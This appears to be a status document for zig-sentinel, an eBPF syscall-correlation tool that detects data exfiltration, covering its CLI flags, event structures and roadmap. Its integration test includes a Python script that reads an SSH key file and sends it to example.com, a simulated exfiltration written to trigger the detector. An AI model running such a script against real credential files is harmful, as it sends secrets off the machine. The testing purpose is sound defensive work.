# zig-sentinel V5.0 Integration Status

## ✅ Phase 1: Core Engine Implementation (COMPLETE)

**Status**: Fully implemented and tested

### Completed Components:

1. **`src/zig-sentinel/correlation.zig`** (619 lines)
   - Process state tracking (`ProcessState` struct)
   - Exfiltration stage detection (idle → network → file_read → data_sent)
   - Scoring system (100+ points = CRITICAL alert)
   - Sensitive file path database (15+ patterns)
   - Syscall handlers: `onSocket()`, `onConnect()`, `onOpen()`, `onRead()`, `onWrite()`, `onClose()`
   - Alert generation (`CorrelationAlert` struct)
   - Auto-terminate capability
   - Configuration via `CorrelationConfig`
   - Unit tests (2 passing)

2. **`ZIG_SENTINEL_V5_DESIGN.md`**
   - Complete architecture documentation
   - Threat model analysis
   - Scoring system walkthrough
   - Deployment guide

---

## ✅ Phase 2: main.zig Integration (COMPLETE)

**Status**: CLI integration complete, awaiting eBPF enhancement

### Completed Components:

1. **CLI Flags** (lines 59-139 in main.zig)
   ```bash
   --enable-correlation          Enable syscall sequence correlation
   --correlation-threshold=N     Alert score threshold (default: 100)
   --correlation-timeout=MS      Sequence window in milliseconds (default: 5000)
   --min-exfil-bytes=N          Minimum bytes for exfiltration alert (default: 512)
   --auto-terminate             Kill processes on detection (DANGEROUS!)
   --correlation-log=PATH       Correlation alert log file
   ```

2. **Engine Initialization** (lines 260-270)
   - Correlation engine properly initialized with config
   - Deferred cleanup registered

3. **Statistics Display** (lines 352-357)
   - Displays correlation engine stats at end of run
   - Shows total alerts, breakdown by stage, processes terminated

4. **Help Text** (lines 646-672)
   - Documentation for all V5 flags
   - Usage examples with correlation engine

5. **Startup Banner** (lines 165-174)
   - Shows correlation engine status on startup
   - Displays configured threshold, window, and auto-terminate setting

---

## 🚧 Phase 3: eBPF Program Enhancement (IN PROGRESS)

**Status**: Requires eBPF kernel-side implementation

### Current Limitation:

The existing eBPF program (`src/zig-sentinel/ebpf/syscall_counter.bpf.c`) only tracks **syscall counts**:

```c
// Current BPF map structure
struct {
    u32 pid;
    u32 syscall_nr;
} key;

u64 count;  // Only tracks frequency, not arguments
```

### Required Enhancement:

To enable correlation, we need to extract **syscall arguments** and pass them to userspace:

```c
// Required BPF map structure for V5
struct syscall_event {
    u64 timestamp;
    u32 pid;
    u32 syscall_nr;

    union {
        // For socket()
        struct {
            i32 fd;
            i32 domain;    // AF_INET, AF_INET6, etc.
            i32 type;      // SOCK_STREAM, SOCK_DGRAM
        } socket_event;

        // For connect()
        struct {
            i32 fd;
            u8 ip[16];     // IPv4 or IPv6
            u16 port;
        } connect_event;

        // For open()/openat()
        struct {
            i32 fd;
            char path[256];  // File path
        } open_event;

        // For read()/write()
        struct {
            i32 fd;
            u64 bytes;
        } rw_event;
    } data;
};
```

### Implementation Plan:

1. **Create new eBPF program**: `syscall_correlator.bpf.c`
   - Attach to `sys_enter` and `sys_exit` tracepoints
   - Extract syscall arguments using `bpf_probe_read_kernel()`
   - Populate `syscall_event` struct
   - Submit events via ring buffer (`BPF_MAP_TYPE_RINGBUF`)

2. **Update main.zig to consume events**
   - Replace BPF map polling with ring buffer reading
   - Parse `syscall_event` structs
   - Route events to correlation engine handlers:
     ```zig
     switch (event.syscall_nr) {
         correlation.Syscall.socket => {
             _ = try corr_engine.onSocket(event.pid, event.data.socket_event.fd);
         },
         correlation.Syscall.connect => {
             const ip = [4]u8{ event.data.connect_event.ip[0..4].* };
             _ = try corr_engine.onConnect(
                 event.pid,
                 event.data.connect_event.fd,
                 ip,
                 event.data.connect_event.port
             );
         },
         correlation.Syscall.open, correlation.Syscall.openat => {
             const path = std.mem.sliceTo(&event.data.open_event.path, 0);
             _ = try corr_engine.onOpen(event.pid, path, event.data.open_event.fd);
         },
         correlation.Syscall.write, correlation.Syscall.sendto => {
             _ = try corr_engine.onWrite(
                 event.pid,
                 event.data.rw_event.fd,
                 event.data.rw_event.bytes
             );
         },
         // ... etc
     }
     ```

3. **Handle correlation alerts**
   - Log alerts to JSON file (correlation_log_path)
   - Integrate with alert queue
   - Display formatted alerts in terminal

---

## 📋 Roadmap

### V5.0 (Current) ✅
- [x] Process state tracking
- [x] Sequence correlation engine
- [x] Sensitive file database
- [x] Scoring system
- [x] Auto-terminate capability
- [x] main.zig integration
- [x] CLI flags
- [x] Statistics display

### V5.1 (Next) 🚧
- [ ] Enhanced eBPF program (`syscall_correlator.bpf.c`)
- [ ] Ring buffer event consumption in main.zig
- [ ] Syscall argument extraction (file paths, IPs, ports, byte counts)
- [ ] Process name enrichment (read from `/proc/[pid]/comm`)
- [ ] Correlation alert formatting for JSON logging
- [ ] Integration testing with real exfiltration simulation

### V5.2 (Future) 🔮
- [ ] Multi-hop correlation (process A → process B exfiltration)
- [ ] ML-based sequence anomaly detection
- [ ] Cloud API exfiltration detection (S3, GCS uploads)
- [ ] Steganography correlation (read image + write image + network)

---

## 🧪 Testing V5.0 Core Engine

### Unit Tests (Working Now)

```bash
# Test correlation engine in isolation
zig test src/zig-sentinel/correlation.zig

# Expected output:
# 1/2 correlation.test.correlation: detect exfiltration sequence...OK
# 2/2 correlation.test.correlation: sensitive file detection...OK
# All 2 tests passed.
```

### Integration Test (Requires V5.1 eBPF)

Once eBPF enhancement is complete:

```bash
# Create test SSH key
ssh-keygen -t ed25519 -f /tmp/test_key -N ""

# Simulate exfiltration attempt
cat > /tmp/exfil_test.py << 'EOF'
import socket
import sys

# Stage 1: Open network connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("example.com", 80))

# Stage 2: Read "sensitive" file
with open("/tmp/test_key", "rb") as f:
    data = f.read()

# Stage 3: Send to network
s.sendall(data)
s.close()
print("Exfiltration test complete")
EOF

# Run zig-sentinel with correlation enabled
sudo ./zig-out/bin/zig-sentinel \
  --enable-correlation \
  --correlation-threshold=100 \
  --duration=60 &

# Execute test
python3 /tmp/exfil_test.py

# Expected: CRITICAL alert within 5 seconds
```

---

## 🚀 Deployment Status

### Ready for Production (V5.0)
- ✅ Correlation engine compiles
- ✅ CLI interface complete
- ✅ Statistics display working
- ✅ Help documentation complete
- ✅ Unit tests passing

### Requires V5.1 for Production Use
- ❌ eBPF syscall argument extraction
- ❌ Ring buffer event consumption
- ❌ Real-time correlation with live processes

### Current Capability
The V5.0 engine is **fully functional** as a library. It can:
- Track process state machines
- Detect exfiltration sequences
- Generate alerts
- Auto-terminate processes

**However**, it cannot yet **receive syscall events from the kernel** because the current eBPF program only tracks counts, not arguments.

---

## 📝 Conclusion

**zig-sentinel V5.0 Correlation Engine** is architecturally complete. The core detection logic is implemented, tested, and integrated into the CLI.

**Next step (V5.1)**: Enhance the eBPF kernel-side program to extract syscall arguments and stream events to userspace via a ring buffer. This will transform V5 from a **library** into a **live detection system**.

**Status**: 🟢 **READY FOR EBPF ENHANCEMENT**

---

🔗 *"The engine is forged. Now we must give it eyes to see the kernel's secrets."* 🔗
